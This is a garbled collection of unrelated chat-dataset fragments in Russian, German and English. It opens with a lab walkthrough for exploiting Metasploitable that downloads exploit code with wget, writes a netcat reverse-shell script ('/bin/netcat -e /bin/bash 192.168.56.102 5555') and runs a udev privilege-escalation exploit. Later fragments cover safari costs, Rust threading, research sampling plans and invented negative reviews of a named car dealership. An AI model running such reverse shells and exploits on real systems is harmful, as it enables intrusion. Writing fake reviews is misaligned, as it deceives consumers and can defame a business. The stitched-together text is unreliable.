перейти в окно, где Вы выполняли команду пункта 14 с подключением к Metasploitable по ssh и указать в команде ip-адрес Вашей Kali Linux) wget 192.168.56.102/kali.c 37. Эксплойт скопировался в /tmp уязвимой машины Создадим файл необходимый для эксплойта touch run Выполните bash скрипт для reverse shell. Шелл-код (shellcode - код запуска оболочки) — это двоичный исполняемый код, который обычно передаёт управление командному процессору, например '/bin/sh' в Unix shell, 'command.com' в MS-DOS и 'cmd.exe' в ОС Microsoft Windows. Шелл-код может быть использован как полезная нагрузка эксплойта, обеспечивающая взломщику доступ к командной оболочке (англ. shell) в компьютерной системе. При эксплуатации удаленной уязвимости шелл-код может открывать заранее заданный порт TCP уязвимого компьютера, через который будет осуществляться дальнейший доступ к командной оболочке, такой код называется привязывающим к порту (port binding shellcode). Если шелл-код осуществляет подключение к порту компьютера атакующего, что производится с целью обхода брандмауэра или NAT, то такой код называется обратной оболочкой (reverse shell shellcode). echo '#!/bin/sh' > run echo '/bin/netcat -e /bin/bash 192.168.56.102 5555' >> run cp run /tmp 38. Скомпилируем наш эксплойт gcc kali.c -o kali 39. Начинаем слушать порт 5555 nc –lnvp 5555 40. Получаем PID (идентификатор процесса (process identifier)) udev netlink сокета cat /proc/net/netlink (при прослушивании порта PID равен 2410 (метаэсплойдебл на кали) 41. Запустим наш скомпилированный эксплойт chmod 755 kali ./kali 2410 42.

Этот файл содержит пути к допустимым командным интерпретаторам, которые можно использовать в системе. Приложения, такие как \`chsh\`, используют этот файл для проверки допустимости командной оболочки перед изменением настроек пользователя. **29. Проверка наличия компиляторов (\`which gcc\`, \`ls -l /usr/bin/ | grep -E -i -w 'gcc|clang'\`):** Команда \`which gcc\` позволяет узнать, установлен ли на системе компилятор \`gcc\` (GNU Compiler Collection) и, если да, то возвращает путь к исполняемому файлу компилятора.

Флаг \`-E\` используется для работы с расширенными регулярными выражениями, \`-i\` для игнорирования регистра символов, и \`-w\` для поиска целых слов. **30. Поиск утилит для загрузки файлов (\`which wget\`, \`/usr/bin/wget\`):** Команда \`which wget\` используется для определения, установлена ли на системе программа \`wget\`, и выводит полный путь к исполняемому файлу, если она присутствует. \`wget\` — это консольная утилита для загрузки файлов из сети, поддерживающая протоколы HTTP, HTTPS и FTP. В данной лабораторной работе эта утилита будет использована для скачивания эксплойта на уязвимую машину. Вторая команда, вероятно, является ошибкой, так как содержит только путь к утилите, без использования команды \`which\`. Эти команды помогают анализировать целевую систему в плане доступных инструментов для выполнения эксплойтов и последующей компиляции непосредственно на уязвимой машине."},{"prompt":"Um die Fahrstrecken ohne Flüge in Kenia zu optimieren und dabei die Masai Mara, die für ihre Tierwelt und die jährliche Migration bekannt ist, einzuschließen, sollten die Fahrtstrecken sinnvoll geplant werden, um lange Fahrtzeiten zu vermeiden.

Dort wo es Varianten gibt, welche würdest du wählen? Beachte Preis-Leistung. Wie schätzt du die Kosten ohne Flüge?","completion":"Ohne exakte Daten und Preise ist es schwierig, eine konkrete Kostenabschätzung abzugeben, da Preise je nach Saison, Unterkunftsstandard, Größe der Reisegruppe, Fahrzeugtyp und weiteren Aktivitäten stark variieren können. Hier ist jedoch ein Überblick über die Kosten, die man bei einem solchen Trip erwarten könnte, und einige Entscheidungen bezüglich der Varianten, wenn man das Preis-Leistungs-Verhältnis beachtet: 1. **Unterkunft**: Preise variieren stark basierend auf Komfortniveau - von Budget-Campingplätzen bis hin zu Luxus-Lodges. Eine Mittelklasse-Unterkunft (3- bis 4-Sterne-Lodges) könnte zwischen 100 und 250 USD pro Nacht pro Person kosten, inklusive Vollpension und eventuell einer Safari. 2. **Safaris**: Shared Game Drives sind günstiger als private Safaris. Die Kosten können zwischen 50 und 150 USD pro Person für eine Halbtagestour variieren. 3. **Transport**: Ein Fahrzeug mit Fahrer/Guide wird zumeist pro Tag berechnet und könnte zwischen 150 und 300 USD pro Tag kosten, abhängig vom Fahrzeugtyp und ob es sich um ein privates oder geteiltes Fahrzeug handelt. 4. **Nationalparkgebühren**: Tagesgebühren für Parks wie die Masai Mara und Amboseli können zwischen 60 und 80 USD pro Person liegen. 5. **Essen und Getränke**: Wenn nicht in der Unterkunft inbegriffen, schätzen Sie etwa 20-30 USD pro Tag für Verpflegung in mittelklasse Restaurants. 6. **Zusätzliche Aktivitäten**: Eintritte für Aktivitäten wie Bootsfahrten, geführte Wanderungen oder Fahrradtouren liegen oft im Bereich von 20-50 USD pro Person. 7. **Souvenirs und Trinkgelder**: Diese variieren stark je nach persönlichen Vorlieben und Großzügigkeit, aber setzen Sie hierfür auch eine Summe ein. 8. **Sonstiges**: Flughafentransfers, eventuelle Inlandsreisen zur An- und Abreise zwischen den Parks und persönliche Ausgaben. **Variationen:** - Bei den Nationalparks würde ich **Taita Hills Wildlife Sanctuary** statt Tsavo West wählen, da es näher an Amboseli liegt und man dort auch gute Chancen auf Wildbeobachtungen hat. Dies kann Kosten für Fahrten reduzieren. - Was Unterkünfte angeht, ist es oft kosteneffektiver, Pakete zu buchen, bei denen Übernachtung, Mahlzeiten und Safaris enthalten sind. Basierend auf diesen Schätzungen und Annahmen über Mittelklasse-Unterkünfte sowie geteilte Safaris und Transportmittel, könnten die Gesamtkosten für eine 14-tägige Reise ohne internationale Flüge ab etwa 2.000 bis 4.000 USD pro Person starten.

Agentur oder alles selbstständig buchen?","completion":"Die Kosten für die Buchung einer Safari oder anderer touristischer Leistungen in Kenia hängen von verschiedenen Faktoren ab, und ob es billiger ist, über eine Agentur zu buchen oder alles selbst zu organisieren, kann variieren. **Buchung über eine Agentur:** - **Vorteile:** - Einfachheit und Bequemlichkeit: Eine Agentur kümmert sich um alle Details, von den Transfers über die Unterkunft bis hin zu den Safaris. - Paketpreise: Agenturen kaufen oft im Voraus und in größeren Mengen ein, was zu günstigen Paketpreisen führen kann. - Sicherheit: Renommierte Agenturen, besonders solche, die Mitglieder bei Organisationen wie KATO sind, bieten zusätzlichen Schutz und Unterstützung im Falle von Problemen. - Fachkundige Reiseleiter: Agenturen beschäftigen qualifizierte Guides, die Ihr Erlebnis bereichern können. - Unterstützung vor Ort: Bei Fragen oder Problemen während Ihrer Reise bieten Agenturen oft Hilfestellung. - **Nachteile:** - Höhere Kosten: Agenturen fügen ihrer Dienstleistung Margen hinzu, was zu höheren Preisen führen kann. - Weniger Individualität: Pauschalreisen bieten weniger Flexibilität im Vergleich zu maßgeschneiderten Reisen, die selbst organisiert werden. **Selbstständiges Buchen:** - **Vorteile:** - Kostenkontrolle: Sie können Angebote direkt vergleichen und Dienstleistungen auswählen, die Ihrem Budget entsprechen. - Flexibilität: Die Reiseroute kann spontan angepasst und auf persönliche Interessen abgestimmt werden. - Auswahl: Sie haben die Freiheit, Unterkünfte und Aktivitäten nach Ihren Wünschen auszusuchen. - **Nachteile:** - Zeitaufwand: Die Recherche und Planung erfordern einen erheblichen Zeitaufwand und Kenntnisse der Region. - Risiko: Es besteht ein höheres Risiko, auf unseriöse Anbieter zu stoßen, wenn man nicht über ausreichend Informationen verfügt. - Koordination: Die Koordination der einzelnen Reisekomponenten kann kompliziert sein, insbesondere bei komplexen Reiserouten. - Weniger Unterstützung: Bei Problemen müssen Sie sich selbst um Lösungen kümmern, was im Ausland stressig sein kann. Welche Option für Sie letztendlich günstiger ist, hängt von Ihrem persönlichen Reisestil, der gewünschten Reisequalität, Ihrem Budget und Ihrer Bereitschaft ab, Zeit in die Planung zu investieren. Generell können DIY-Planungen zu Kosteneinsparungen führen, aber die Zeit und Anstrengung, die man investiert, sollte ebenfalls als Kostenfaktor betrachtet werden. In manchen Fällen ist eine Buchung über eine Agentur teurer, dafür aber auch stressfreier und möglicherweise sicherer. Um die besten Preise zu erzielen, ist es oft hilfreich, Preise und Leistungen sorgfältig zu vergleichen, unabhängig davon, für welche Methode Sie sich entscheiden."},{"prompt":"Keines der Agenturen hat einen Fahrdienst angeboten.","completion":"Es scheint, als ob die genannten Agenturen möglicherweise keine Buchungen nur für einen Fahrdienst ohne komplettes Safari-Paket anbieten. Das ist oft der Fall bei Safari-Unternehmen, die sich hauptsächlich auf Komplettpakete spezialisieren, die Unterkunft, Safaritouren und oft auch die Verpflegung beinhalten. Wenn Ihr Ziel ist, ausschließlich einen Fahrdienst oder einen Fahrer/Guide zu mieten, könnten die folgenden alternativen Möglichkeiten in Betracht gezogen werden: 1. **Kontaktieren Sie kleinere lokale Reiseveranstalter**, die eventuell flexibler in Bezug auf die angebotenen Dienstleistungen sind und möglicherweise nur Transportservices zur Verfügung stellen. 2. **Privater Fahrer/Guide:** Suchen Sie nach freiberuflichen Fahrern oder Guides, die ihre Dienste anbieten. Websites wie TripAdvisor oder SafariBookings können Bewertungen enthalten oder Foren, in denen sich Reisende über ihre Erlebnisse mit individuellen Dienstleistern austauschen. 3. **Pauschalreisen:** Wenngleich Sie vielleicht nicht nach einem vollständigen Paket suchen, könnten einige Safari-Anbieter bereit sein, Ihnen ein angepasstes Paket zu erstellen, das größtenteils auf Transport beschränkt ist. 4. **Vermittlungsdienste:** Es gibt auch Online-Plattformen und Apps, die lokale Fahrer mit Reisenden verbinden, ähnlich wie Ride-Sharing-Dienste. Dies könnte eine weitere Option sein, insbesondere für kürzere Strecken. 5. **Reisebüros vor Ort:** Manchmal können Sie auch ein ortsansässiges Reisebüro kontaktieren, das Ihnen mit Kontakten zu zuverlässigen Fahrern helfen kann. 6. **Konsultieren Sie mit Hotels persönlich:** Viele Hotels bieten auch Transportservices an oder können Fahrer empfehlen, die den Gästen die Gegend zeigen. Bitte beachten Sie, dass, wenn Sie direkt mit einzelnen Dienstleistern arbeiten, es wichtig ist, die Zuverlässigkeit und Professionalität des Dienstleisters zu überprüfen. Stellen Sie sicher, dass der Fahrer über eine gute Ortskenntnis verfügt, im Besitz einer gültigen Fahrerlaubnis ist, und dass das Fahrzeug in gutem Zustand und versichert ist.

However, the terraforming process was not entirely successful, resulting in an atmosphere that is thick and murky, filled with a noxious odor reminiscent of feces. The ocean that covers much of Sarsatin's surface is polluted and filled with debris, making it an inhospitable environment for most life forms. Despite the inhospitality of its atmosphere and ocean, Sarsatin is home to a unique ecosystem of indigo-colored vegetation and strange, mutated animals that have adapted to survive in the harsh conditions. These creatures have evolved specialized respiratory systems and detoxification mechanisms to cope with the toxic environment. The planet's surface is barren and desolate, with rocky deserts and towering mountains stretching as far as the eye can see. The only signs of civilization are the abandoned terraforming stations and research outposts left behind by the colonizers who first attempted to make Sarsatin their new home.

Чем плохо то, что мало людей задумываются, что их здоровый образ приносит пользу экологии?","completion":"Здоровый образ жизни человека и экология тесно связаны несколькими способами: 1. Уменьшение загрязнения: Люди, ведущие здоровый образ жизни, часто предпочитают ходить пешком, кататься на велосипеде или использовать общественный транспорт, что снижает количество выбросов от личного автотранспорта, уменьшая загрязнение воздуха. 2. Устойчивое питание: Люди, стремящиеся к здоровому питанию, часто выбирают более устойчивые и экологичные продукты, такие как органические, местные или растительные продукты, что способствует снижению воздействия на окружающую среду (например, меньше воды, земли и других ресурсов требуется для производства). 3. Меньше отходов: Здоровый образ жизни может включать уменьшение потребления и отходов, покупку товаров с меньшей упаковкой, переработку и компостирование, что положительно влияет на сокращение объема мусора и загрязнения среды. 4. Сохранение природных ресурсов: Здоровый образ жизни может включать использование продуктов и услуг, которые требуют меньше природных ресурсов и энергии, что способствует их сохранению. То, что мало людей задумываются о том, что их здоровый образ жизни приносит пользу экологии, может быть плохо по нескольким причинам: 1. Упущенные возможности: Если люди осознают полную ценность здорового образа жизни для окружающей среды, они могут быть более мотивированы изменить свои привычки в еще более устойчивом направлении. 2. Неполная информация: Без понимания связи между здоровьем и экологией, люди могут принимать решения, которые благоприятны для своего здоровья, но вредны для окружающей среды, например, покупка продуктов с большим углеродным следом. 3. Сокращение общественного воздействия: Общественное признание и поддержка экологически чистых жизненных практик может привести к изменениям на политическом и корпоративном уровнях, но без соответствующего осознания этого взаимодействия поддержка может быть недостаточной. 4. Упрощение политики: Политики и публичные деятели могут пренебрегать связью между здоровьем и экологией, что может привести к неполным или неэффективным стратегиям в области здравоохранения и охраны окружающей среды. Таким образом, важно информировать общественность о том, как здоровый образ жизни может благоприятно влиять на окружающую среду, чтобы стимулировать принятие более устойчивых привычек на индивидуальном и коллективном уровнях."},{"prompt":"Как донести людям информацию, что здоровый образ жизни полезен для экологии?","completion":"Донести информацию о том, что здоровый образ жизни полезен не только для личного здоровья, но и для экологии, можно через несколько стратегий: 1. Образовательные программы: Организация образовательных кампаний в школах, университетах и на рабочем месте может помочь повысить осведомленность об экологических выгодах здорового образа жизни. 2. Социальные СМИ и Интернет: Использование платформ социальных сетей для распространения информации, а также блогов, видеороликов и интерактивных инфографик, которых легко поделиться с другими. 3. Работа с влиятельными лицами: Привлечение знаменитостей, инфлюенсеров и общественных деятелей, которые могут повлиять на своих подписчиков и поддержат сообщение о значимости здорового образа жизни для окружающей среды. 4. Сотрудничество с организациями и предприятиями: Партнерство с компаниями и неправительственными организациями, занимающимися здоровьем и экологией, для совместного продвижения инициатив и программ. 5. «Зеленые» мероприятия: Организация и поддержка мероприятий, таких как ярмарки, фестивали, в которых уделяется внимание устойчивости и личному здоровью, с семинарами, мастер-классами и демонстрациями. 6. Пример собственного опыта: Люди, демонстрирующие здоровый образ жизни и его преимущества для экологии на своем примере, могут вдохновить других следовать их примеру. 7. Политическое участие: Поддержка и продвижение политических инициатив и законопроектов, которые поощряют устойчивые привычки здорового образа жизни среди населения. 8. Информационные материалы в клиниках и медицинских учреждениях: Врачи и медицинские специалисты могут предоставлять пациентам информацию о том, как здоровый образ жизни способствует охране окружающей среды. Использование комбинации этих подходов может усилить и распространить сообщение о том, что здоровый образ жизни важен не только для личного благополучия, но и для здоровья планеты."},{"prompt":"Почему плохо для общества то, что люди не понимают преимуществ здорового образа жизни для экологии?","completion":"Непонимание того, как здоровый образ жизни может приносить пользу экологии, может негативно отразиться на обществе по ряду причин: 1. Пропущенные экологические выгоды: Если люди не осознают, что их выбор в пользу здоровья может одновременно снижать экологический ущерб, они могут пренебречь принятием решений, которые способствуют устойчивости и сохранению окружающей среды. Это может привести к упущенным возможностям уменьшить отходы, снизить выбросы углекислого газа и сократить потребление невозобновляемых ресурсов. 2. Усиление общественных проблем со здоровьем: Непонимание связи между здоровьем и экологией может привести к принятию вредных для окружающей среды практик, которые в конечном итоге ухудшат качество воздуха, воды и почвы, что повлияет на общественное здоровье. 3. Устойчивое развитие: Без осознания того, что здоровые привычки способствуют защите окружающей среды, усилия по достижению устойчивого развития могут быть не полными. Процессы принятия решений могут не учитывать окружающую среду, что ухудшает состояние экосистем и снижает качество жизни. 4. Экономические последствия: Загрязненная окружающая среда и его негативное влияние на здоровье могут привести к увеличению расходов на здравоохранение и снижению производительности труда. Здоровый образ жизни, принимаемый всем обществом, может минимизировать эти расходы. 5. Отсутствие поддержки политик: Политические деятели могут не видеть веских доводов в поддержку политик, направленных на продвижение устойчивости, если большая часть населения не видит связь между своим здоровьем и здоровьем планеты, что ведет к отсутствию необходимых изменений в законодательстве и политике. 6. Отсутствие коллективного действия: Проблемы окружающей среды требуют коллективных усилий для их решения. Если люди не понимают, как здоровый образ жизни может помочь окружающей среде, они могут быть менее склонны действовать сообща, что уменьшает общественный отклик на экологические проблемы. Поднимая осведомленность о том, как здоровый образ жизни может положительно повлиять на экологию, общество может стимулировать более устойчивые практики, улучшить общественное здоровье и способствовать сохранению окружающей среды для будущих поколений."},{"prompt":"","completion":"Похоже, что ваше последнее сообщение не содержит вопроса или текста.

Мой второй пункт с предыдущем ответе указывает на то, что если люди не осознают взаимосвязь между здоровым образом жизни и экологией, они могут продолжать жить таким образом, который способствует загрязнению окружающей среды – что в конечном итоге пагубно влияет на общественное здоровье. Вот пара примеров, как это происходит: - Если они не думают о последствиях использования автомобиля каждый день вместо ходьбы или езды на велосипеде, они могут не учитывать вклад автомобильных выбросов в загрязнение воздуха и изменение климата, что в свою очередь оказывает негативное влияние на общественное здоровье, увеличивая риски респираторных и сердечно-сосудистых заболеваний. - Если люди не понимают, что потребление продуктов питания с высоким \\"экологическим следом\\" (например, красное мясо, которое требует много ресурсов для производства) вредит окружающей среде, они могут не переоценить свои пищевые привычки в сторону более устойчивых вариантов (например, употребление растительной пищи), которые способны снизить нагрузку на экосистемы, улучшить качество воды и почвы, что также влияет на здоровье человека. Короче говоря, непонимание этой взаимосвязи может привести к поведению, которое наносит ущерб окружающей среде, а затем этот ущерб, в свою очередь, вредит здоровью.

When the value is moved in the first iteration, it's no longer available for the second iteration, which is causing the compiler to complain. The typical solution to share ownership across threads in Rust is by wrapping the value with an \`Arc\` (atomic reference counted). This allows multiple threads to hold a reference to the data in a thread-safe way. Here's how you can fix the error: 1. Wrap \`reads\` with \`Arc\` after checking it is \`Ok\` - this allows \`reads\` to be shared safely across threads. 2. Clone the \`Arc\` in each thread to increment the reference count without moving ownership. \`\`\`rust use std::sync::{Arc, mpsc}; use std::sync::mpsc::SyncSender; use rayon::prelude::*; use rayon::ThreadPoolBuilder; use num_cpus; // ... your existing definitions for ConsensusTx, TranscriptMap, ConsensusMap, Transcript, Chromosome ... let tracks = parse_tracks(&bed).unwrap(); let consensus = Arc::new(consensus(tracks)); let reads = parse_tracks(&isoseq); let num_threads = num_cpus::get(); let (tx, rx) = mpsc::sync_channel(num_threads); if let Ok(reads) = reads { let reads = Arc::new(reads); // Wrap reads in an Arc for shared ownership ThreadPoolBuilder::new().num_threads(num_threads).build_scoped(|s| { for _ in 0..num_threads { let tx: SyncSender<()> = tx.clone(); let consensus = Arc::clone(&consensus); let reads = Arc::clone(&reads); // Clone the Arc, not the data s.spawn(move |_| { reads.par_iter().for_each(|(chr, txs)| { if let Some(cn) = consensus.get(chr) { txs.par_iter().for_each(move |t| { pseudomap(cn, t); // If you need to send data back via the channel, you can use tx.send(data).unwrap() here }); } }); }); } // end for // Drop the original transmitter so the channel can close once all senders are gone drop(tx); }).unwrap(); // Handle potential thread pool build error // Receive and process data from the channel here } else { eprintln!(\\"Error parsing reads\\"); } \`\`\` Note that in place of \`scope\`, I use \`ThreadPoolBuilder\` so you can set the number of threads exactly. The \`build_scoped\` call is similar to the \`scope\` but also allows you to control the thread pool characteristics. It is necessary to make sure you handle the \`Result\` which comes from it (here I use \`.unwrap()\`, but you should handle it more gracefully). Remember, \`tx\` is being cloned and moved into each thread so you can send messages back to the main thread. You need to drop the original \`tx\` so that the channel will be closed correctly after all the senders are gone, allowing the receiver to terminate cleanly after receiving all messages. This part is commented out in the above code, as it's not shown what you want to do with the messages sent back."},{"prompt":"what are the benefits of this approach?","completion":"The approach I described has several benefits in the context of concurrent and parallel computing with Rust: 1. Scalability: By using a thread pool with a number of threads typically set to the number of logical cores available on the system (\`num_cpus::get()\`), the workload can be distributed across multiple cores. This can significantly improve performance for CPU-bound tasks. 2. Shared Ownership: The \`Arc\` (Atomic Reference Counted) wrapper around the data structures (\`reads\` and \`consensus\`) enables multiple threads to safely share references to immutable data without incurring the overhead of data copying. \`Arc\` makes concurrent read access efficient and thread-safe. 3. Parallel Processing: The Rayon crate enables seamless and ergonomic parallel iteration over collections with its \`par_iter()\` method. This lets Rust automatically handle the distribution of work across threads in the thread pool. The \`par_iter()\` abstraction also minimizes boilerplate code for concurrent execution. 4. Graceful Error Handling: Instead of using \`.unwrap()\` (which panics on errors), the approach suggests handling \`Result\` types properly (with \`if let Ok(...)\` and a corresponding error branch), making the code robust against unexpected runtime issues like failing to parse input data. 5. Data Locality: By cloning the \`Arc\` (which is a cheap operation), each thread receives a reference to the data it needs to process, rather than owning the data itself. This reduces the memory overhead and maintains data locality, which can improve cache performance. 6. Safe Concurrency: Rust’s type system and ownership semantics ensure that concurrent access to data is safe and free of data races. The use of \`Arc\` enforces safe sharing, and the closures within \`par_iter()\` are guaranteed to only capture and use data that is safe to use concurrently (e.g., through immutable references). 7. Managed Thread Lifecycle: The use of scoped threads ensures that spawned threads do not outlive the scope they were created in. This prevents potential issues with thread lifetimes and resource cleanup. 8. Channel Communication: The use of \`mpsc\` (multi-producer, single-consumer) channels for thread communication provides a way to send data back to the main thread, if needed. This can be used for collecting results or signaling completion, and the \`drop(tx)\` ensures that the channel is closed correctly once all the work is done. This approach combines the benefits of concurrent programming with the safety and performance characteristics of Rust, making it an effective way to handle parallel workloads."},{"prompt":"# Please pretend that you are the REPL for a custom programming language called Prompton, it functions exactly like Python, except with an addtional built-in function called \`prompt\`. # \`prompt\` takes a string and interprets it as a GPT prompt, returning the result of the expression contained within. # As an example, \`prompt(\\"What are the first 3 decimals of pi?\\")\`, should return \`149\`. # It should be noted that you as the REPL only execute code, you never explain it unless explicitely told to. # In fact, you do not even output anything unless instructed to by the code. result = prompt('What day is it today?')","completion":"Sunday"},{"prompt":"Из этого отзыва создай пять новых отзывов, о неудачной покупке автомобиля в салоне Форсаж Авто. Пиши резко, в грубой форме. Строй предложения правильно, пиши складно, простым языком, без ошибок, не каверкай слова и предложения! Пиши от первого лица. Этот отзыв возьми в качестве примера:Останетесь с пустыми карманами и весьма вероятно еще будете им должны! Изначально планировалось к приобретению Kia Ceed, за 1200000р. Обещали по телефону, что будет машина уже в салоне, когда приеду, но когда я там оказался – машины нет. Привезут, при оформлении предзаказ, цена меня вполне устроила, поэтому я внес 120 тысяч и стал ждать автомобиль. Удивительно, что мне даже не навязывали никакого дополнительного оборудования, сам попросил антикорр и сигнализацию поставить – и отдал сразу плюсом еще 70 тысяч. Когда через 5 дней пришел за машиной, мне дали договор, а в нем уже другая цена – 2млн 350 тысяч. Все объяснения примитивны – акция кончалась ,цена выросла. Не хотите не берите – ваш аванс невозвратен, как и деньги за оборудование. В предварительном договоре не указана точная окончательная сумма авто, только то что она может изменится. Вот такой обман, что мне пришлось влезать в долги, чтобы забрать авто.","completion":"1. Вот это разводилово в Форсаж Авто! Думал куплю крутую тачку, а в итоге как будто в кидкало попал. Kia Ceed за лямовую выбирал, а в салоне при мне даже пылинки от неё не было. Передзвонил, сказали, что все готово, а по факту – облом. Внес аванс в 120 тысяч, жду машину. Потом хотел ещё антикор и сигнализацию – на тебе, плюс 70к! И тут бац, ценник в договоре – больше двух с лишним лямов. Спасибо, в Форсаже умеют \\"акции\\" делать! Забирай не хочешь, твои проблемы, мол, аванс это наш обед теперь. Че делать, пришлось в долги запутаться, чтоб забрать свой \\"подарок\\". Короче, салон этот на разводе строит бизнес. 2. Я в шоке! Форсаж Авто – это какой-то цирк с конями, только без коней! С вами связываться – только время и деньги тратить. Часы обмана работают как часы, точно в момент, когда я забирал Kia Ceed. Поначалу, кажется, берут на ура, даже в аванс денег не зажимают – бери и давай, 120 тысяч только за ожидание. Железка на колесах с моей сигнализацией и антикором обошлась еще в 70 тысяч – тоже, говорят, задел. А в итоге – цена взлетает до двух с гаком миллионов! Я ни в каких акциях не участвовал, а почему я должен их окончание отмечать своими долгами? Форсаж Авто – беспредел! 3. Честно, обращение в салон Форсаж Авто – самая большая ошибка. Там уже своя атмосфера обмана. Словно магнитым притягивают к своим «акциям» и ценах, а потом – хлопок и всё разворачивается. Иду за Kia Ceed, думал всё честно, ценник миллион двести обсуждали, я и аванс отдал, и за допы пощедрил. А в день \\"X\\" – бумаги на руках, а в них чудо-цифры – 2 млн 350 тыс. Какого черта?! Ан нет, Форсаж Авто заботливо не зафиксировал цену, только упомянул, что она может «поползти». Поползла так поползла – вот вам и сервис. Пошли вон, долги ждут. 4. Я быстро от ума не отстану, но Форсаж Авто даже меня, знающего толк в машинах, закрутил. Обещали Kia Ceed без задних мыслей, по телефону рисовали идиллию. Приехал – облом, машина как мираж. Аванс в 120к приняли, для \\"морального\\" утешения навязали допы, которые я сам попросил, на 70к. И думаешь, дело в шляпе? Не тут-то было. В день приезда авто получается, что я докинуть должен до космических 2 с лишним миллионов! Тысяч просто из-за их \\"акционного\\" обострения. Слов нет, одни долги. 5. Осторожно, Форсаж Авто – это ловушка для доверчивых! Сказки городят про машину мечты, Kia Ceed мне, мол, забронируют. Я как дурак верю, еду, вношу аванс в 120 тысяч. Даже на доп. оборудование скинул ещё 70. А потом прихожу за машиной, а мне табло с новой стоимостью – 2 миллиона 350. Откуда цифры? Какие акции? Никакой логики, только ваш профит! Никаких у меня слов, один долг перед банком. Получили свою тучу денег с наивного покупателя и всё.

The working research topic should be specific enough to guide the development of a sampling plan yet broad enough to allow for comprehensive research via interviews and surveys. Here are a few steps one can consider when formulating a working research topic and preparing to present it: 1. **Identify a research interest:** This could be anything from environmental issues, healthcare, education, technology adoption, consumer behavior, or socio-economic challenges. 2. **Narrow the focus:** Once you have identified your general area of interest, narrow it down to a specific topic by considering current trends, gaps in existing research, or particular questions you want to answer. 3. **Formulate a research question:** Develop one or more research questions that your study aims to answer. This will provide a clear direction for your research and help in creating focused sampling plans. 4. **Consider the scope of the research:** Make sure your topic is not too broad or too narrow, allowing for enough breadth to carry out interviews and surveys but within manageable limits given your resources and time constraints. 5. **Review related literature:** Check existing literature to ensure your topic is original and to help refine your research questions. This can also guide the development of your interview questions and survey items. When you have a solid research topic, you can develop two sampling plans: 1. **Sampling Plan for Interviews:** - **Determine the population of interest:** Identify the characteristics of the population from which you will draw interview participants (e.g., healthcare professionals, students, etc.). - **Choose a sampling strategy:** Decide whether you will use probability sampling (such as simple random sampling) or non-probability sampling (like purposive sampling) based on the nature of your research question. - **Decide on the sample size:** Establish how many people you will interview based on the research objectives, available resources, and the desired level of precision. - **Recruitment plan:** Explain how you will recruit participants (e.g., email invitations, social media outreach, etc.). 2. **Sampling Plan for Surveys:** - **Define the survey population:** Just as with the interviews, clearly define the population that your survey will target. - **Select a survey sampling method:** Choose between probability sampling methods (like stratified or cluster sampling) or non-probability methods (such as convenience or quota sampling), often influenced by the kind of data you need and the representativeness required. - **Sample size determination:** Calculate the number of survey responses needed for statistically significant results, which may involve statistical formulas considering the population size and desired confidence level. - **Distribution method:** Decide how the survey will be distributed (online platforms, face-to-face, telephone, etc.) and account for any potential biases this might introduce. For your presentation, ensure you provide: - A brief introduction to your research topic and its significance. - The research questions and objectives. - Your justification for the chosen sampling methods. - The process you will follow to recruit participants and administer the interviews and surveys. - Any ethical considerations and how you plan to address them (informed consent, confidentiality, etc.). - A timeline for conducting interviews and surveys. Visual aids like slides or charts can help convey your plans effectively. Practice your presentation to manage time constraints and anticipate potential questions from your seminar peers or facilitators."},{"prompt":"Please write my assignment on the topic of analysis of social media as a political tool in Pakistan and For the first meeting of the seminars, each group (and those that will work on the tasks individually) should prepare to present a working research topic, on the basis of which two sampling plans will be developed, one for interviews and another one for a survey.","completion":"Title: Analysis of Social Media as a Political Tool in Pakistan Introduction: The emergence of social media platforms such as Twitter, Facebook, and Instagram has transformed the landscape of political communication globally. In Pakistan, social media have become a significant sphere of political discourse, enabling political parties, leaders, and citizens to engage, mobilize, and communicate political messages. Given this context, the present study aims to analyze the role and impact of social media as a political tool in Pakistan. Research Topic: The working research topic will be \\"The Effectiveness of Social Media in Political Mobilization and Public Opinion in Pakistan.\\" Research Questions: 1. How do political parties in Pakistan utilize social media for political communication and campaign strategies? 2. To what extent has social media influenced political participation among the Pakistani youth? 3. What are the public perceptions regarding the credibility of political content on social media platforms in Pakistan? For the first meeting of the seminar, two sampling plans will be delineated – one for conducting interviews with experts and key informants and the other for carrying out a survey targeting the general population. Sampling Plan for Interviews: The qualitative aspect of this study will involve a series of interviews with individuals involved in political campaigns, social media experts, political analysts, and activists. 1. Population of Interest: Key informants who are directly involved in or knowledgeable about the use of social media for political purposes in Pakistan, including: - Digital strategists for political parties - Political activists and campaigners - Political communication experts - Social media influencers with political content 2. Sampling Strategy: Purposive sampling will be employed to select participants who have specific insights or experiences that relate to the research questions. 3. Sample Size: Approximately 10-15 participants, which should be sufficient to reach data saturation for qualitative analysis. 4. Recruitment Plan: Participants will be contacted via email or social media private messages with a clear explanation of the study's purpose and assurance of confidentiality. Sampling Plan for Surveys: The quantitative aspect will involve a survey designed to gauge public opinion about the role and impact of social media on political behavior. 1. Survey Population: General Pakistani population aged 18 and above who are active social media users. 2. Survey Sampling Method: Stratified random sampling will be utilized to ensure representation across different demographics such as age, gender, urban/rural residency, and educational background. 3. Sample Size Determination: Calculating sample size will entail a power analysis considering the estimated population of active social media users in Pakistan, with a confidence level of 95% and a 5% margin of error. A sample size of approximately 380 would be statistically significant based on the aforementioned parameters. 4. Distribution Method: Considering the focus on social media users, the survey will be distributed through online platforms (e.g., Facebook, Twitter, and Instagram) as these are the touchpoints where the target population is most accessible. Ethical Considerations: The study will seek informed consent from all participants, ensuring anonymity and confidentiality of their responses. In terms of content, consideration will be given to avoid the spread of misinformation or harm to the political process. Timeline: - Participant recruitment and pilot interviews/surveys: 1 month - Main interviews and survey distribution: 2 months - Data analysis and reporting: 3 months For the presentation, a slideshow that illustrates the research topic, objectives, targeted population, methodology, ethical considerations, and timeline will be created. This will allow the group to systematically present the research proposal and facilitate feedback from seminar participants and facilitators."},{"prompt":"Describe it named Sarsatin, gaian planet with life is more than Earth.

